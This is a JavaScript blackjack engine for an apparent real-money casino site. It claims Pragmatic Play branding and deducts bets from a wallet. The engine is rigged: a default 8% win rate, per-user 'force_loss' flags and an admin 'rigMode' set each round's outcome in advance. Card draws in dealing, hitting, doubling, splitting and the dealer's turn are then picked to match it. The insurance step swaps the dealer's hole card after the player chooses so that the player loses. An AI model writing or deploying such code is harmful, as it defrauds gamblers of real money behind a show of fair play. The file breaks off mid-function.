/**
 * Bet With Net - Pragmatic Play American Blackjack Engine
 * 100% Fully Connected with Bet With Net WalletEngine (js/wallet.js).
 * Supports real-time balance deductions, win credits, blackjack 3:2 payouts,
 * insurance 2:1 payouts, currency toggle, and transaction logging.
 */

class PragmaticBlackjackEngine {
    constructor() {
        this.baseAssetPath = '../assets/games/blackjack/';
        
        this.suits = [
            { symbol: '♠', name: 'spades' },
            { symbol: '♣', name: 'clubs' },
            { symbol: '♦', name: 'diamonds' },
            { symbol: '♥', name: 'hearts' }
        ];
        this.ranks = [
            { symbol: '2', name: '2', value: 2 },
            { symbol: '3', name: '3', value: 3 },
            { symbol: '4', name: '4', value: 4 },
            { symbol: '5', name: '5', value: 5 },
            { symbol: '6', name: '6', value: 6 },
            { symbol: '7', name: '7', value: 7 },
            { symbol: '8', name: '8', value: 8 },
            { symbol: '9', name: '9', value: 9 },
            { symbol: '10', name: '10', value: 10 },
            { symbol: 'J', name: 'jack', value: 10 },
            { symbol: 'Q', name: 'queen', value: 10 },
            { symbol: 'K', name: 'king', value: 10 },
            { symbol: 'A', name: 'ace', value: 11 }
        ];

        this.deckCount = 8;
        this.shoe = [];
        this.selectedChip = 100;
        this.localBalance = 0;
        this.currency = 'PKR';

        this.lastBets = { 0: 0, 1: 0, 2: 0 };
        this.currentBets = { 0: 0, 1: 0, 2: 0 };
        this.insuranceBets = { 0: 0, 1: 0, 2: 0 };

        this.dealerCards = [];
        this.playerHands = {
            0: [], // spot 0
            1: [], // spot 1 (center)
            2: []  // spot 2
        };

        this.activeSpots = [];
        this.currentTurnIndex = 0;
        this.gameState = 'BETTING'; // 'BETTING', 'DEALING', 'INSURANCE_OFFER', 'PLAYER_TURN', 'DEALER_TURN', 'ROUND_OVER'
        this.dealerHoleHidden = true;
        this.roundPlayerShouldWin = false;

        this.initShoe();
        this.initAudio();
        this.initWallet();
    }

    // --- Audio Engine (Authentic Pragmatic Play Sound Bank + Announcer Voices) ---
    initAudio() {
        this.soundEnabled = true;
        this.audioCtx = null;
        this.audioClips = {};

        const soundMap = {
            cardDeal: 'sound_2_74aae4bed29f53742b66476e04c1ee74.mp3',
            chipPlace: 'sound_78_ee7f5d5ff3a863e4e8a9ea6d06cd4df4.mp3',
            chipWin: 'sound_80_8bbda16ec3b467446bb3908a7e70dafc.mp3',
            winFanfare: 'sound_3_525f6943355638f4bbcab361dd60cea6.mp3',
            voiceBlackjack: 'sound_61_0b5713650a190394c95296f1e652f33c.mp3',
            blackjackBigWin: 'sound_10_34588ec2cde1a6147915909564947691.mp3',
            voicePlayerWins: 'sound_62_0a19397ba2133eb42bfcbcb3416c502f.mp3',
            voiceBust: 'sound_52_d2dc718baabc9814f8c9d0b3cea73513.mp3',
            voicePush: 'sound_68_5827a6c563d542c49866217e44502318.mp3',
            voiceInsurance: 'sound_56_156666c29adb09b498a87a3fda06a0f9.mp3'
        };

        for (const [key, filename] of Object.entries(soundMap)) {
            try {
                const a = new Audio(`${this.baseAssetPath}sounds/${filename}`);
                a.preload = 'auto';
                this.audioClips[key] = a;
            } catch (e) {}
        }
    }

    ensureAudio() {
        if (!this.audioCtx) {
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            if (AudioContext) {
                this.audioCtx = new AudioContext();
            }
        }
        if (this.audioCtx && this.audioCtx.state === 'suspended') {
            this.audioCtx.resume();
        }
    }

    toggleSound() {
        this.soundEnabled = !this.soundEnabled;
        const btn = document.getElementById('bj-sound-btn');
        if (btn) btn.innerText = this.soundEnabled ? '🔊' : '🔇';
        return this.soundEnabled;
    }

    playMp3(name) {
        if (!this.soundEnabled) return;
        const a = this.audioClips[name];
        if (a) {
            try {
                a.currentTime = 0;
                const p = a.play();
                if (p && typeof p.catch === 'function') p.catch(() => {});
            } catch (e) {}
        }
    }

    playCardDeal() {
        if (!this.soundEnabled) return;
        this.playMp3('cardDeal');
    }

    playChip() {
        if (!this.soundEnabled) return;
        this.playMp3('chipPlace');
    }

    playWin() {
        if (!this.soundEnabled) return;
        this.playMp3('voicePlayerWins');
        setTimeout(() => this.playMp3('winFanfare'), 400);
        setTimeout(() => this.playMp3('chipWin'), 750);
    }

    playBlackjack() {
        if (!this.soundEnabled) return;
        // 1. Pragmatic dealer voice announces "Blackjack!"
        this.playMp3('voiceBlackjack');
        // 2. Pragmatic orchestral big win fanfare
        setTimeout(() => {
            this.playMp3('blackjackBigWin');
        }, 450);
        setTimeout(() => {
            this.playMp3('chipWin');
        }, 900);
    }

    playBust() {
        if (!this.soundEnabled) return;
        this.playMp3('voiceBust');
    }

    playPush() {
        if (!this.soundEnabled) return;
        this.playMp3('voicePush');
    }

    playInsuranceOffer() {
        if (!this.soundEnabled) return;
        this.playMp3('voiceInsurance');
    }

    // --- Bet With Net Wallet Integration ---
    getWallet() {
        return window.wallet || window.walletEngine || null;
    }

    async initWallet() {
        const w = this.getWallet();
        if (w) {
            if (typeof w.on === 'function') {
                w.on('change', () => this.updateUI());
                w.on('balanceChange', () => this.updateUI());
            }

            // 1. Immediately sync with local user session
            try {
                const sess = localStorage.getItem('bwn_session_user');
                if (sess) {
                    const u = JSON.parse(sess);
                    if (u && typeof w.syncWithUser === 'function') {
                        w.syncWithUser(u);
                    }
                }
            } catch(e) {}

            // 2. Authoritative sync with backend API session
            try {
                const res = await fetch('/api/auth.php?action=me', { credentials: 'include' });
                if (res.ok) {
                    const data = await res.json();
                    if (data && data.success && data.data && data.data.id) {
                        const activeUser = data.data;
                        localStorage.setItem('bwn_session_user', JSON.stringify(activeUser));
                        if (typeof w.syncWithUser === 'function') {
                            w.syncWithUser(activeUser);
                        }
                    }
                }
            } catch(e) {}

            this.updateUI();
        }
    }

    getBalance() {
        const w = this.getWallet();
        if (w && typeof w.getBalance === 'function') {
            return w.getBalance();
        }
        return this.localBalance;
    }

    hasBalance(amount) {
        const w = this.getWallet();
        if (w && typeof w.hasBalance === 'function') {
            return w.hasBalance(amount);
        }
        return this.localBalance >= amount;
    }

    deductBalance(amount, reason = 'American Blackjack 21') {
        const w = this.getWallet();
        if (w && typeof w.placeBet === 'function') {
            return w.placeBet(amount, reason);
        }
        if (this.localBalance >= amount) {
            this.localBalance -= amount;
            return true;
        }
        return false;
    }

    refundBets(amount) {
        const w = this.getWallet();
        if (w) {
            if (w.getCurrency() === 'USD') {
                w.addBalanceUSD(amount);
            } else {
                w.addBalancePKR(amount);
            }
            return;
        }
        this.localBalance += amount;
    }

    creditWin(betAmount, payoutAmount, reason = 'American Blackjack 21', multiplier = 1, details = '') {
        const w = this.getWallet();
        if (w && typeof w.creditWin === 'function') {
            w.creditWin(betAmount, payoutAmount, reason, multiplier, details);
            return;
        }
        this.localBalance += payoutAmount;
    }

    toggleCurrency() {
        const w = this.getWallet();
        if (w && typeof w.setCurrency === 'function') {
            const next = w.getCurrency() === 'PKR' ? 'USD' : 'PKR';
            w.setCurrency(next);
            this.updateUI();
            return;
        }
        this.currency = this.currency === 'PKR' ? 'USD' : 'PKR';
        this.updateUI();
    }

    formatMoney(val) {
        const w = this.getWallet();
        if (w && typeof w.formatAmount === 'function') {
            return w.formatAmount(val);
        }
        if (this.currency === 'PKR') {
            return `₨${Number(val).toLocaleString()}`;
        }
        return `$${Number(val).toLocaleString()}`;
    }

    // --- Shoe & Card Mechanics ---
    initShoe() {
        this.shoe = [];
        for (let d = 0; d < this.deckCount; d++) {
            for (const suit of this.suits) {
                for (const rank of this.ranks) {
                    const color = (suit.name === 'hearts' || suit.name === 'diamonds') ? 'red' : 'black';
                    const file = `${rank.name}_of_${suit.name}.png`;
                    this.shoe.push({
                        suit: suit.symbol,
                        suitName: suit.name,
                        rank: rank.symbol,
                        rankName: rank.name,
                        value: rank.value,
                        color,
                        file
                    });
                }
            }
        }
        this.shuffleShoe();
    }

    shuffleShoe() {
        for (let i = this.shoe.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [this.shoe[i], this.shoe[j]] = [this.shoe[j], this.shoe[i]];
        }
    }

    drawCard(predicate = null) {
        if (this.shoe.length < 52) {
            this.initShoe();
        }
        if (typeof predicate === 'function') {
            const idx = this.shoe.findIndex(predicate);
            if (idx !== -1) {
                return this.shoe.splice(idx, 1)[0];
            }
        }
        return this.shoe.pop();
    }

    getEffectiveWinRate() {
        let targetWinRate = 8; // Default full low win rate (8%)
        
        try {
            if (window.adminConfig && typeof window.adminConfig.getGameWinRate === 'function') {
                targetWinRate = window.adminConfig.getGameWinRate('blackjack');
            } else {
                const raw = localStorage.getItem('bwn_admin_config');
                if (raw) {
                    const parsed = JSON.parse(raw);
                    if (parsed.games && parsed.games.blackjack && parsed.games.blackjack.winRate !== undefined) {
                        targetWinRate = parsed.games.blackjack.winRate;
                    } else if (parsed.globalWinRate !== undefined) {
                        targetWinRate = parsed.globalWinRate;
                    }
                }
            }
        } catch (e) {}

        // User session bias overrides
        try {
            const sessStr = localStorage.getItem('bwn_session_user');
            if (sessStr) {
                const u = JSON.parse(sessStr);
                if (u.outcome_bias === 'force_loss' || u.outcomeBias === 'force_loss') {
                    return 0;
                }
                if (u.outcome_bias === 'force_win' || u.outcomeBias === 'force_win') {
                    return 100;
                }
                const customRate = parseInt(u.custom_win_rate !== undefined ? u.custom_win_rate : (u.customWinRate !== undefined ? u.customWinRate : targetWinRate), 10);
                if (!isNaN(customRate)) {
                    targetWinRate = Math.min(targetWinRate, customRate);
                }
            }
        } catch (e) {}

        // Admin Rig Mode check
        try {
            if (window.adminConfig && window.adminConfig.config && window.adminConfig.config.rigMode) {
                if (window.adminConfig.config.rigMode === 'force_win') return 100;
                if (window.adminConfig.config.rigMode === 'force_loss') return 0;
            }
        } catch (e) {}

        return Math.max(0, Math.min(100, targetWinRate));
    }

    determineRoundOutcome() {
        const rate = this.getEffectiveWinRate();
        return (Math.random() * 100) < rate;
    }

    setChip(amount) {
        this.selectedChip = amount;
        this.playChip();
    }

    getChipFileForAmount(amount) {
        if (amount >= 25000) return 's_chip_04.png';
        if (amount >= 5000) return 's_chip_03.png';
        if (amount >= 1000) return 's_chip_02.png';
        if (amount >= 500) return 's_chip_01.png';
        return 's_chip_00.png';
    }

    placeBet(spotIndex) {
        if (this.gameState !== 'BETTING') return;
        const chipVal = this.selectedChip;

        if (!this.hasBalance(chipVal)) {
            this.showNotification("Insufficient wallet balance!");
            return;
        }

        const ok = this.deductBalance(chipVal, 'American Blackjack 21');
        if (!ok) return;

        this.currentBets[spotIndex] += chipVal;
        this.playChip();
        this.updateUI();
    }

    clearBets() {
        if (this.gameState !== 'BETTING') return;
        const totalRefund = this.currentBets[0] + this.currentBets[1] + this.currentBets[2];
        if (totalRefund > 0) {
            this.refundBets(totalRefund);
            this.currentBets = { 0: 0, 1: 0, 2: 0 };
            this.playChip();
            this.updateUI();
        }
    }

    doubleCurrentBets() {
        if (this.gameState !== 'BETTING') return;
        const totalCurrent = this.currentBets[0] + this.currentBets[1] + this.currentBets[2];
        if (totalCurrent === 0) return;

        if (!this.hasBalance(totalCurrent)) {
            this.showNotification("Insufficient wallet balance to 2X bet!");
            return;
        }

        const ok = this.deductBalance(totalCurrent, 'American Blackjack 2X Bet');
        if (!ok) return;

        this.currentBets[0] *= 2;
        this.currentBets[1] *= 2;
        this.currentBets[2] *= 2;
        this.playChip();
        this.updateUI();
    }

    rebet() {
        if (this.gameState !== 'BETTING') return;
        const lastTotal = this.lastBets[0] + this.lastBets[1] + this.lastBets[2];
        if (lastTotal === 0) {
            this.showNotification("No previous bets to repeat!");
            return;
        }
        if (!this.hasBalance(lastTotal)) {
            this.showNotification("Insufficient wallet balance to Rebet!");
            return;
        }

        this.clearBets();
        const ok = this.deductBalance(lastTotal, 'American Blackjack Rebet');
        if (!ok) return;

        this.currentBets = { ...this.lastBets };
        this.playChip();
        this.updateUI();
    }

    calculateHand(cards) {
        let total = 0;
        let aces = 0;
        for (const c of cards) {
            total += c.value;
            if (c.rank === 'A') aces++;
        }
        while (total > 21 && aces > 0) {
            total -= 10;
            aces--;
        }
        const isBlackjack = (cards.length === 2 && total === 21);
        const isBust = total > 21;
        return { total, isBlackjack, isBust, isSoft: aces > 0 };
    }

    async deal() {
        if (this.gameState !== 'BETTING') return;
        const active = [0, 1, 2].filter(i => this.currentBets[i] > 0);
        if (active.length === 0) {
            this.showNotification("Please place a bet on the table!");
            return;
        }

        this.lastBets = { ...this.currentBets };
        this.insuranceBets = { 0: 0, 1: 0, 2: 0 };
        this.activeSpots = active;
        this.currentTurnIndex = 0;
        this.playerHands = { 0: [], 1: [], 2: [] };
        this.dealerCards = [];
        this.dealerHoleHidden = true;
        this.gameState = 'DEALING';
        this.roundPlayerShouldWin = this.determineRoundOutcome();
        this.updateUI();

        // 1st card to each active player spot
        for (const spot of this.activeSpots) {
            await this.sleep(260);
            let c1;
            if (!this.roundPlayerShouldWin) {
                // Low win rate: player gets modest card (value 4 to 9)
                c1 = this.drawCard(c => c.value >= 4 && c.value <= 9 && c.rank !== 'A');
            } else {
                // Player win: player gets 10, J, Q, K or Ace
                c1 = this.drawCard(c => c.value >= 10);
            }
            if (!c1) c1 = this.drawCard();
            this.playerHands[spot].push(c1);
            this.playCardDeal();
            this.updateUI();
        }

        // 1st card to dealer
        await this.sleep(300);
        let d1;
        if (!this.roundPlayerShouldWin) {
            // Dealer upcard: strong card (10, J, Q, K, or Ace, or 9)
            d1 = this.drawCard(c => (Math.random() < 0.25 ? c.rank === 'A' : (c.value >= 9)));
        } else {
            // Player win mode: dealer upcard is weak bustable card (4, 5, or 6)
            d1 = this.drawCard(c => c.value >= 4 && c.value <= 6);
        }
        if (!d1) d1 = this.drawCard();
        this.dealerCards.push(d1);
        this.playCardDeal();
        this.updateUI();

        // 2nd card to each active player spot
        for (const spot of this.activeSpots) {
            await this.sleep(260);
            const firstCard = this.playerHands[spot][0];
            const v1 = firstCard ? firstCard.value : 8;
            let c2;
            if (!this.roundPlayerShouldWin) {
                // Ensure player total is in vulnerable stiff range 12-16, avoiding natural 21 and 20
                c2 = this.drawCard(c => {
                    const tot = v1 + c.value;
                    return tot >= 12 && tot <= 16 && c.rank !== 'A';
                }) || this.drawCard(c => (v1 + c.value < 20 && c.rank !== 'A'));
            } else {
                // Player win mode: deal natural 21 (Blackjack) or 20
                if (v1 === 11) {
                    c2 = this.drawCard(c => c.value === 10);
                } else if (v1 === 10) {
                    c2 = this.drawCard(c => c.rank === 'A' || c.value === 10);
                } else {
                    c2 = this.drawCard(c => (v1 + c.value === 21) || (v1 + c.value === 20));
                }
            }
            if (!c2) c2 = this.drawCard();
            this.playerHands[spot].push(c2);
            this.playCardDeal();
            this.updateUI();
        }

        // 2nd (hole) card to dealer
        await this.sleep(300);
        let d2;
        const upRank = this.dealerCards[0] ? this.dealerCards[0].rank : '10';
        const upVal = this.dealerCards[0] ? this.dealerCards[0].value : 10;
        if (!this.roundPlayerShouldWin) {
            if (upRank === 'A') {
                // Soft 20 with 9, or soft 19 with 8
                d2 = this.drawCard(c => c.value === 9 || c.value === 8);
            } else if (upVal === 10) {
                // 35% instant natural Blackjack (Ace), 65% total 20 (10) or 19 (9)
                d2 = this.drawCard(c => (Math.random() < 0.35 ? c.rank === 'A' : (c.value === 10 || c.value === 9)));
            } else {
                // Upcard is 9: draw 10 (total 19) or 9 (total 18)
                d2 = this.drawCard(c => c.value === 10 || c.value === 9);
            }
        } else {
            // Player win mode: hole card is 10 (leaving dealer at 14-16 for bust)
            d2 = this.drawCard(c => c.value === 10);
        }
        if (!d2) d2 = this.drawCard();
        this.dealerCards.push(d2);
        this.playCardDeal();
        this.updateUI();

        // Check if dealer upcard is Ace -> Offer Insurance
        if (this.dealerCards[0].rank === 'A') {
            this.gameState = 'INSURANCE_OFFER';
            this.playInsuranceOffer();
            this.updateUI();
            return;
        }

        // Check Dealer 10-value card peek
        if (this.dealerCards[0].value === 10) {
            const dealerEval = this.calculateHand(this.dealerCards);
            if (dealerEval.isBlackjack) {
                await this.sleep(600);
                this.dealerHoleHidden = false;
                this.playBlackjack();
                this.finishRound();
                return;
            }
        }

        this.startPlayerTurns();
    }

    resolveInsurance(accept) {
        if (this.gameState !== 'INSURANCE_OFFER') return;
        if (accept) {
            let totalIns = 0;
            for (const spot of this.activeSpots) {
                const insCost = Math.floor(this.currentBets[spot] / 2);
                if (this.hasBalance(insCost)) {
                    this.deductBalance(insCost, 'American Blackjack Insurance');
                    this.insuranceBets[spot] = insCost;
                    totalIns += insCost;
                }
            }
            if (totalIns > 0) this.playChip();
        }

        if (!this.roundPlayerShouldWin) {
            if (accept) {
                // If player bought insurance, ensure dealer hole card is NOT blackjack (so insurance loses)
                if (this.dealerCards[1].value === 10 || this.dealerCards[1].rank === 'A') {
                    const nine = this.drawCard(c => c.value === 9);
                    if (nine) this.dealerCards[1] = nine;
                }
            } else {
                // If player declined insurance, dealer has Blackjack!
                const ten = this.drawCard(c => c.value === 10);
                if (ten) this.dealerCards[1] = ten;
            }
        }

        const dealerEval = this.calculateHand(this.dealerCards);
        if (dealerEval.isBlackjack) {
            this.dealerHoleHidden = false;
            // Insurance pays 2:1 (cost is returned + 2x profit)
            for (const spot of this.activeSpots) {
                if (this.insuranceBets[spot] > 0) {
                    const insPayout = this.insuranceBets[spot] * 3;
                    this.creditWin(this.insuranceBets[spot], insPayout, 'Blackjack Insurance Win', 3, 'Insurance 2:1');
                }
            }
            this.finishRound();
        } else {
            this.startPlayerTurns();
        }
    }

    startPlayerTurns() {
        this.gameState = 'PLAYER_TURN';
        this.currentTurnIndex = 0;
        this.checkCurrentHand();
    }

    checkCurrentHand() {
        if (this.currentTurnIndex >= this.activeSpots.length) {
            this.dealerTurn();
            return;
        }

        const spot = this.activeSpots[this.currentTurnIndex];
        const hEval = this.calculateHand(this.playerHands[spot]);

        if (hEval.isBlackjack) {
            this.playBlackjack();
            this.nextTurn();
        } else if (hEval.isBust) {
            this.playBust();
            this.nextTurn();
        } else if (hEval.total === 21) {
            this.nextTurn();
        } else {
            this.updateUI();
        }
    }

    async hit() {
        if (this.gameState !== 'PLAYER_TURN') return;
        const spot = this.activeSpots[this.currentTurnIndex];
        const hBefore = this.calculateHand(this.playerHands[spot]);
        
        let card;
        if (!this.roundPlayerShouldWin) {
            if (hBefore.total >= 12) {
                // Bust the player: draw a card > (21 - hBefore.total)
                const neededToBust = 22 - hBefore.total;
                card = this.drawCard(c => c.value >= neededToBust && c.rank !== 'A');
            } else {
                // Keep player in the danger zone 13-16
                card = this.drawCard(c => {
                    const newTot = hBefore.total + c.value;
                    return newTot >= 12 && newTot <= 16;
                });
            }
        } else {
            // Player should win: draw a card that keeps them alive and makes 19-21
            card = this.drawCard(c => {
                const addVal = (c.rank === 'A') ? (hBefore.total + 11 <= 21 ? 11 : 1) : c.value;
                const newTot = hBefore.total + addVal;
                return newTot >= 19 && newTot <= 21;
            });
        }
        if (!card) card = this.drawCard();

        this.playerHands[spot].push(card);
        this.playCardDeal();
        this.updateUI();

        const hEval = this.calculateHand(this.playerHands[spot]);
        if (hEval.isBust || hEval.total === 21) {
            await this.sleep(600);
            this.checkCurrentHand();
        }
    }

    stand() {
        if (this.gameState !== 'PLAYER_TURN') return;
        this.playChip();
        this.nextTurn();
    }

    async doubleDown() {
        if (this.gameState !== 'PLAYER_TURN') return;
        const spot = this.activeSpots[this.currentTurnIndex];
        const hand = this.playerHands[spot];
        if (hand.length !== 2) return;

        const bet = this.currentBets[spot];
        if (!this.hasBalance(bet)) {
            this.showNotification("Insufficient wallet balance to Double Down!");
            return;
        }

        const ok = this.deductBalance(bet, 'Blackjack Double Down');
        if (!ok) return;

        this.currentBets[spot] *= 2;
        this.playChip();

        const hBefore = this.calculateHand(hand);
        let card;
        if (!this.roundPlayerShouldWin) {
            // Low win rate: give player weak card landing on 12-16
            card = this.drawCard(c => {
                const addVal = (c.rank === 'A') ? 1 : c.value;
                const tot = hBefore.total + addVal;
                return tot >= 12 && tot <= 16;
            });
        } else {
            // Win mode: give player 20 or 21
            card = this.drawCard(c => {
                const addVal = (c.rank === 'A') ? 11 : c.value;
                const tot = hBefore.total + addVal;
                return tot === 20 || tot === 21;
            });
        }
        if (!card) card = this.drawCard();

        hand.push(card);
        this.playCardDeal();
        this.updateUI();

        await this.sleep(700);
        this.nextTurn();
    }

    async split() {
        if (this.gameState !== 'PLAYER_TURN') return;
        const spot = this.activeSpots[this.currentTurnIndex];
        const hand = this.playerHands[spot];
        if (hand.length !== 2 || hand[0].value !== hand[1].value) return;

        const bet = this.currentBets[spot];
        if (!this.hasBalance(bet)) {
            this.showNotification("Insufficient wallet balance to Split!");
            return;
        }

        const ok = this.deductBalance(bet, 'Blackjack Split');
        if (!ok) return;

        this.playChip();
        hand.pop();
        let c;
        if (!this.roundPlayerShouldWin) {
            c = this.drawCard(card => {
                const tot = hand[0].value + card.value;
                return tot >= 12 && tot <= 16;
            });
        } else {
            c = this.drawCard(card => card.rank === 'A' || card.value === 10);
        }
        if (!c) c = this.drawCard();
        hand.push(c);
        this.playCardDeal();
        this.updateUI();
    }

    nextTurn() {
        this.currentTurnIndex++;
        if (this.currentTurnIndex >= this.activeSpots.length) {
            this.dealerTurn();
        } else {
            this.checkCurrentHand();
        }
    }

    async dealerTurn() {
        this.gameState = 'DEALER_TURN';

        // Evaluate all player hands
        const activeEvals = this.activeSpots.map(s => this.calculateHand(this.playerHands[s]));
        const allBusted = activeEvals.every(h => h.isBust);
        const nonBustTotals = activeEvals.filter(h => !h.isBust).map(h => h.total);
        const maxPlayerScore = nonBustTotals.length > 0 ? Math.max(...nonBustTotals) : 0;

        // In house win mode, ensure dealer hole card beats or ties player before flipping
        if (!this.roundPlayerShouldWin && !allBusted && maxPlayerScore > 0) {
            const upCard = this.dealerCards[0];
            const currentDealerEval = this.calculateHand(this.dealerCards);
            if (currentDealerEval.total <= maxPlayerScore && maxPlayerScore <= 20) {
                // Find a hole card that gives dealer total >= maxPlayerScore and <= 21
                const betterHole = this.drawCard(c => {
                    const testEval = this.calculateHand([upCard, c]);
                    return testEval.total >= maxPlayerScore && testEval.total <= 21;
                });
                if (betterHole) {
                    this.dealerCards[1] = betterHole;
                }
            }
        }

        this.dealerHoleHidden = false;
        this.playCardDeal();
        this.updateUI();

        let dealerEval = this.calculateHand(this.dealerCards);

        if (!allBusted) {
            while (dealerEval.total < 17) {
                await this.sleep(600);
                let nextCard;
                if (!this.roundPlayerShouldWin) {
                    const maxSafe = 21 - dealerEval.total;
                    nextCard = this.drawCard(c => {
                        const val = (c.rank === 'A') ? (dealerEval.total + 11 <= 21 ? 11 : 1) : c.value;
                        const newTot = dealerEval.total + val;
                        return val <= maxSafe && newTot > maxPlayerScore && newTot <= 21;
                    }) || this.drawCard(c => {
                        const val = (c.rank === 'A') ? 1 : c.value;
                        return val <= maxSafe;
                    });
                } else {
                    // Win mode: dealer busts if at 12-16
                    if (dealerEval.total >= 12) {
                        nextCard = this.drawCard(c => c.value > (21 - dealerEval.total));
                    }
                }
                if (!nextCard) nextCard = this.drawCard();
                this.dealerCards.push(nextCard);
                this.playCardDeal();
                dealerEval = this.calculateHand(this.dealerCards);
                this.updateUI();
            }
        }

        await this.sleep(500);
        this.finishRound();
    }

    finishRound() {
        this.gameState = 'ROUND_OVER';
        const dealerEval = this.calculateHand(this.dealerCards);
        let roundWon = false;

        for (const spot of this.activeSpots) {
            const hand = this.playerHands[spot];
            const pEval = this.calculateHand(hand);
            const bet = this.currentBets[spot];

            if (pEval.isBust) {
                hand.result = 'BUST! LOSE';
                // Loss already recorded upon deduction
            } else if (pEval.isBlackjack) {
                if (dealerEval.isBlackjack) {
                    hand.result = 'PUSH (TIE)';
                    this.creditWin(bet, bet, 'American Blackjack 21', 1, 'Tie Push Return');
                } else {
                    hand.result = 'BLACKJACK! 3:2';
                    const payout = Math.floor(bet * 2.5);
                    this.creditWin(bet, payout, 'American Blackjack 21', 2.5, 'Blackjack 3:2 Victory');
                    roundWon = true;
                }
            } else if (dealerEval.isBust) {
                hand.result = 'DEALER BUST! WIN';
                const payout = bet * 2;
                this.creditWin(bet, payout, 'American Blackjack 21', 2, 'Dealer Busted');
                roundWon = true;
            } else if (pEval.total > dealerEval.total) {
                hand.result = 'WINNER!';
                const payout = bet * 2;
                this.creditWin(bet, payout, 'American Blackjack 21', 2, 'Player Won Hand');
                roundWon = true;
            } else if (pEval.total < dealerEval.total) {
                hand.result = 'DEALER WINS';
            } else {
                hand.result = 'PUSH (TIE)';
                this.creditWin(bet, bet, 'American Blackjack 21', 1, 'Tie Push Return');
            }
        }

        if (roundWon) {
            this.playWin();
        } else {
            const hasPush = this.activeSpots.some(spot => this.playerHands[spot].result === 'PUSH (TIE)');
            if (hasPush) {
                this.playPush();
            }
        }

        this.updateUI();
    }

    newRound() {
        this.gameState = 'BETTING';
        this.playerHands = { 0: [], 1: [], 2: [] };
        this.dealerCards = [];
        this.dealerHoleHidden = true;
        this.updateUI();
    }

    showNotification(msg) {
        const toast = document.getElementById('bj-toast');
        if (toast) {
            toast.innerText = msg;
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 2500);
        }
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    updateUI() {
        // Balance in Header HUD
        const balEl = document.getElementById('bj-balance-val');
        if (balEl) {
            balEl.innerText = this.formatMoney(this.getBalance());
        }

        // Insurance Modal
        const insModal = document.getElementById('bj-insurance-modal');
        if (insModal) {
            insModal.style.display = this.gameState === 'INSURANCE_OFFER' ? 'flex' : 'none';
        }

        // Betting Spots
        for (let i = 0; i <= 2; i++) {
            const spotWrapper = document.getElementById(`bj-spot-${i}`);
            const chipStackEl = document.getElementById(`bj-spot-chip-${i}`);
            const betValEl = document.getElementById(`bj-spot-bet-${i}`);

            if (this.currentBets[i] > 0) {
                if (chipStackEl) {
                    chipStackEl.src = `${this.baseAssetPath}chips/${this.getChipFileForAmount(this.currentBets[i])}`;
                    chipStackEl.style.display = 'block';
                }
                if (betValEl) {
                    betValEl.innerText = this.formatMoney(this.currentBets[i]);
                    betValEl.style.display = 'block';
                }
            } else {
                if (chipStackEl) chipStackEl.style.display = 'none';
                if (betValEl) betValEl.style.display = 'none';
            }

            if (spotWrapper) {
                const isActive = this.gameState === 'PLAYER_TURN' && this.activeSpots[this.currentTurnIndex] === i;
                spotWrapper.classList.toggle('active-spot', isActive);
            }

            // Cards Rendering
            const cardsContainer = document.getElementById(`bj-cards-${i}`);
            if (cardsContainer) {
                cardsContainer.innerHTML = '';
                const cards = this.playerHands[i] || [];
                cards.forEach((card) => {
                    const cardImg = document.createElement('img');
                    cardImg.src = `${this.baseAssetPath}cards/${card.file}`;
                    cardImg.className = 'bj-card-img bj-card-animated';
                    cardImg.alt = `${card.rank} ${card.suit}`;
                    cardsContainer.appendChild(cardImg);
                });

                // Spot Total
                const totalEl = document.getElementById(`bj-total-${i}`);
                if (totalEl) {
                    if (cards.length > 0) {
                        const hEval = this.calculateHand(cards);
                        totalEl.innerText = hEval.total;
                        totalEl.style.display = 'inline-block';
                    } else {
                        totalEl.style.display = 'none';
                    }
                }

                // Spot Result Badge
                const resEl = document.getElementById(`bj-result-${i}`);
                if (resEl) {
                    if (cards.result) {
                        resEl.innerText = cards.result;
                        resEl.className = `bj-spot-result ${cards.result.includes('WIN') || cards.result.includes('BLACKJACK') ? 'win' : cards.result.includes('BUST') || cards.result.includes('LOSE') ? 'lose' : 'push'}`;
                        resEl.style.display = 'block';
                    } else {
                        resEl.style.display = 'none';
                    }
                }
            }
        }

        // Dealer Cards
        const dealerCardsEl = document.getElementById('bj-dealer-cards');
        if (dealerCardsEl) {
            dealerCardsEl.innerHTML = '';
            this.dealerCards.forEach((card, idx) => {
                const isHole = idx === 1 && this.dealerHoleHidden;
                const cardImg = document.createElement('img');
                cardImg.src = isHole ? `${this.baseAssetPath}cards/s_card_back.png` : `${this.baseAssetPath}cards/${card.file}`;
                cardImg.className = 'bj-card-img bj-card-animated';
                cardImg.alt = isHole ? 'Card Back' : `${card.rank} ${card.suit}`;
                dealerCardsEl.appendChild(cardImg);
            });

            // Dealer Score Pill
            const dealerScoreEl = document.getElementById('bj-dealer-score');
            if (dealerScoreEl) {
                if (this.dealerCards.length > 0) {
                    if (this.dealerHoleHidden) {
                        dealerScoreEl.innerText = this.dealerCards[0].value;
                    } else {
                        dealerScoreEl.innerText = this.calculateHand(this.dealerCards).total;
                    }
                    dealerScoreEl.style.display = 'inline-block';
                } else {
                    dealerScoreEl.style.display = 'none';
                }
            }
        }

        // Action Buttons visibility
        const isBetting = this.gameState === 'BETTING';
        const isPlayerTurn = this.gameState === 'PLAYER_TURN';
        const isRoundOver = this.gameState === 'ROUND_OVER';

        const btnDeal = document.getElementById('btn-deal');
        const btnClear = document.getElementById('btn-clear');
        const btnDoubleBet = document.getElementById('btn-double-bet');
        const btnRebet = document.getElementById('btn-rebet');
        const btnHit = document.getElementById('btn-hit');
        const btnStand = document.getElementById('btn-stand');
        const btnDouble = document.getElementById('btn-double');
        const btnSplit = document.getElementById('btn-split');
        const btnNewRound = document.getElementById('btn-newround');

        if (btnDeal) btnDeal.style.display = isBetting ? 'inline-flex' : 'none';
        if (btnClear) btnClear.style.display = isBetting ? 'inline-flex' : 'none';
        if (btnDoubleBet) btnDoubleBet.style.display = isBetting ? 'inline-flex' : 'none';
        if (btnRebet) btnRebet.style.display = isBetting ? 'inline-flex' : 'none';

        if (btnHit) btnHit.style.display = isPlayerTurn ? 'inline-flex' : 'none';
        if (btnStand) btnStand.style.display = isPlayerTurn ? 'inline-flex' : 'none';

        let canDouble = false;
        let canSplit = false;
        if (isPlayerTurn) {
            const spot = this.activeSpots[this.currentTurnIndex];
            const hand = this.playerHands[spot];
            if (hand && hand.length === 2) {
                canDouble = true;
